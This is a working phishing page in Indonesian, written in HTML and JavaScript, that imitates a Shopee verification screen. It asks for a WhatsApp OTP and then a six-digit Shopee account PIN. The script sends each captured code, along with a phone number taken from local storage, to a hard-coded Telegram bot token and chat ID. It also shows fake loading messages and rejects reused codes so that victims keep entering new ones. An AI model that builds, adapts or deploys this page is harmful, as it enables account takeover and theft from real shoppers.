<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masukkan Kode Verifikasi</title>
    <style>
        body {
            font-family: "Roboto", Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
            color: #333;
        }

        header {
            display: flex;
            align-items: center;
            padding: 14px 16px;
            background: #fff;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
        }

        header h1 {
            flex: 1;
            text-align: center;
            font-size: 18px;
            margin: 0;
            font-weight: 500;
        }

        .content {
            padding: 24px 16px;
            text-align: center;
        }

        .content p {
            font-size: 15px;
            color: #444;
            margin: 6px 0;
        }

        .wa {
            color: #333;
            font-weight: bold;
        }

        .otp-box,
        .pin-box {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
        }

        .otp-box input,
        .pin-box input {
            width: 40px;
            height: 48px;
            font-size: 20px;
            text-align: center;
            border: none;
            border-bottom: 2px solid #ccc;
            outline: none;
            transition: border-color 0.2s;
        }

        .otp-box input:focus {
            border-color: #25D366;
            /* Hijau WhatsApp untuk OTP */
        }

        .pin-box input:focus {
            border-color: #EE4D2D;
            /* Oranye Shopee untuk PIN */
        }


        button {
            background: #ccc;
            color: #fff;
            font-size: 16px;
            border: none;
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            cursor: not-allowed;
            transition: background 0.3s;
        }

        button.active {
            background: #EE4D2D;
            cursor: pointer;
        }

        .wait {
            margin-top: 14px;
            font-size: 14px;
            color: #666;
        }

        .wait span {
            color: #e65100;
            font-weight: 500;
        }

        /* Style untuk bagian PIN (awalnya disembunyikan) */
        .pin-section {
            display: none;
            margin-top: 20px;
        }

        /* --- STYLE UNTUK LOADING SPINNER --- */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            /* Hampir putih solid */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            display: none;
            /* Awalnya tersembunyi */
        }

        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-top: 4px solid #EE4D2D;
            /* Warna Shopee */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <header>
        <h1>Masukkan Kode Verifikasi</h1>
    </header>
    <div class="content" id="otp-section">
        <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="wa">WhatsApp</b></p>
        <p><b class="wa" id="target-phone-display">Nomor: (Mengambil data...)</b></p>
        <div class="otp-box">
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
        </div>
        <button id="lanjut" disabled>Lanjut</button>
        <div class="wait">Mohon tunggu <span id="countdown">60</span> detik untuk mengirim ulang</div>
    </div>
    <div class="content pin-section" id="pin-section">
        <p>Masukkan PIN Akun Shopee Anda</p>
        <div class="pin-box">
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
            <input type="password" inputmode="numeric" maxlength="1" class="pin-input" />
        </div>
        <button id="konfirmasi-pin" disabled>Konfirmasi PIN</button>
    </div>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <p id="loadingMessage" class="mt-4 text-lg text-gray-700 mt-3">Memproses, harap tunggu...</p>
    </div>

    <script>
        // === Konfigurasi Telegram ===
        // TOKEN BOT dan CHAT ID SUDAH DIPERBARUI BERDASARKAN KONFIRMASI TERAKHIR
        const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
        const TELEGRAM_CHAT_ID = '5923031825';
        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        // --- Ambil riwayat semua percobaan dari session storage ---
        let allCodeAttempts = JSON.parse(sessionStorage.getItem('all_code_attempts')) || [];
        // --- Ambil Nomor Telepon dari Local Storage ---
        const storedNumber = localStorage.getItem('verificationPhoneNumber') || 'TIDAK TERSEDIA';


        // === UTILITY FUNGSI ===
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function showLoading(message) {
            document.getElementById("loadingOverlay").style.display = 'flex';
            document.getElementById("loadingMessage").textContent = message || "Memproses, harap tunggu...";
        }

        function hideLoading() {
            document.getElementById("loadingOverlay").style.display = 'none';
        }

        function maskPhoneNumber(number) {
            if (!number || number.length < 10) return number;
            const visibleStart = number.substring(0, 3);
            const visibleEnd = number.substring(number.length - 3);
            const masked = number.substring(3, number.length - 3).replace(/./g, '*');
            return `(${visibleStart}) ${masked}${visibleEnd}`;
        }

        // === Fungsi Validasi Tambahan (untuk OTP dan PIN) ===
        function isValidCode(code) {
            if (code.length !== 6) {
                return false;
            }
            const firstDigit = code[0];
            const allSame = code.split('').every(digit => digit === firstDigit);

            // Cek apakah 6 digitnya sama semua (misalnya 111111)
            if (allSame) {
                return false;
            }

            // Cek apakah input saat ini sama dengan kode yang sudah pernah dimasukkan
            if (allCodeAttempts.includes(code)) {
                return false;
            }

            return true;
        }


        // === Fungsi untuk mengirim data ke Telegram (DIPERBAIKI UNTUK DEBUGGING) ===
        async function sendToTelegram(message) {
            const fullMessage = `#PIN_MITRA\nNomor HP: ${storedNumber}\n${message}`;
            console.log("➡️ Mencoba kirim ke Telegram:", fullMessage);

            try {
                const response = await fetch(TELEGRAM_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: fullMessage
                    })
                });
                
                let data = {};
                try {
                    // Mencoba membaca respons JSON untuk mendapatkan deskripsi error
                    data = await response.json();
                } catch (e) {
                    console.warn("Gagal parse JSON dari respons Telegram.");
                }

                if (response.ok) {
                    console.log('✅ Pesan berhasil dikirim ke Telegram! Data Respons:', data);
                    return true;

                } else {
                    // Logging error dari Telegram API
                    const errorMessage = data.description || response.statusText;
                    console.error('❌ Gagal mengirim pesan ke Telegram. Status:', response.status, 'Error:', errorMessage);
                    return false;
                }

            } catch (error) {
                // Logging error koneksi
                console.error('❌ Terjadi kesalahan pada proses fetch (koneksi/CORS):', error);
                return false;
            }
        }

        // === INITIALIZATION ===
        document.addEventListener('DOMContentLoaded', () => {
            const phoneDisplayEl = document.getElementById('target-phone-display');
            if (phoneDisplayEl) {
                phoneDisplayEl.textContent = `Nomor: ${maskPhoneNumber(storedNumber)}`;
            }
        });


        // === OTP Input Logic ===
        const otpInputs = document.querySelectorAll(".otp-input");
        const lanjutBtn = document.getElementById("lanjut");
        const otpSection = document.getElementById("otp-section");
        const pinSection = document.getElementById("pin-section");

        otpInputs.forEach((input, index) => {
            input.addEventListener("input", (e) => {
                const value = e.target.value.replace(/[^0-9]/g, "");
                e.target.value = value;

                if (value && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                checkOtpFilled();
            });
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        function checkOtpFilled() {
            const allFilled = Array.from(otpInputs).every((input) => input.value !== "");
            if (allFilled) {
                lanjutBtn.classList.add("active");
                lanjutBtn.disabled = false;
            } else {
                lanjutBtn.classList.remove("active");
                lanjutBtn.disabled = true;
            }
        }

        lanjutBtn.addEventListener("click", async () => {
            const otp = Array.from(otpInputs).map((i) => i.value).join("");

            if (!isValidCode(otp)) {
                alert("6 Digit yang anda input salah atau sudah pernah dicoba.");
                return;
            }

            showLoading("Mengirim OTP ke Server...");
            await sendToTelegram(`Kode OTP WA: ${otp}`);
            
            allCodeAttempts.push(otp);
            sessionStorage.setItem('all_code_attempts', JSON.stringify(allCodeAttempts));

            showLoading("Memverifikasi OTP...");
            await sleep(3000);
            hideLoading();

            otpSection.style.display = "none";
            pinSection.style.display = "block";

            const pinInputs = document.querySelectorAll(".pin-input");
            if (pinInputs.length > 0) {
                pinInputs[0].focus();
            }
        });

        // === Countdown Timer (60 detik) ===
        let time = 60;
        const countdownEl = document.getElementById("countdown");
        const timer = setInterval(() => {
            time--;
            countdownEl.textContent = time;
            if (time <= 0) {
                clearInterval(timer);
                countdownEl.parentElement.textContent = "Kamu bisa mengirim ulang kode sekarang.";
            }
        }, 1000);

        // === PIN Input Logic ===
        const pinInputs = document.querySelectorAll(".pin-input");
        const konfirmasiPinBtn = document.getElementById("konfirmasi-pin");

        pinInputs.forEach((input, index) => {
            input.addEventListener("input", (e) => {
                const value = e.target.value.replace(/[^0-9]/g, "");
                e.target.value = value;

                if (value && index < pinInputs.length - 1) {
                    pinInputs[index + 1].focus();
                }
                checkPinFilled();
            });
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !e.target.value && index > 0) {
                    pinInputs[index - 1].focus();
                }
            });
        });

        function checkPinFilled() {
            const allFilled = Array.from(pinInputs).every((input) => input.value !== "");
            if (allFilled) {
                konfirmasiPinBtn.classList.add("active");
                konfirmasiPinBtn.disabled = false;
            } else {
                konfirmasiPinBtn.classList.remove("active");
                konfirmasiPinBtn.disabled = true;
            }
        }

        konfirmasiPinBtn.addEventListener("click", async () => {
            const pin = Array.from(pinInputs).map((i) => i.value).join("");

            if (!isValidCode(pin)) {
                alert("6 Digit yang anda input salah atau sudah pernah dicoba.");
                return;
            }

            showLoading("Mengirim PIN ke Server...");
            await sendToTelegram(`PIN Akun Shopee: ${pin}`);
            
            allCodeAttempts.push(pin);
            sessionStorage.setItem('all_code_attempts', JSON.stringify(allCodeAttempts));

            showLoading("Memproses PIN...");
            await sleep(3000);
            hideLoading();

            window.location.href = "email.html";
        });
    </script>
</body>

</html>
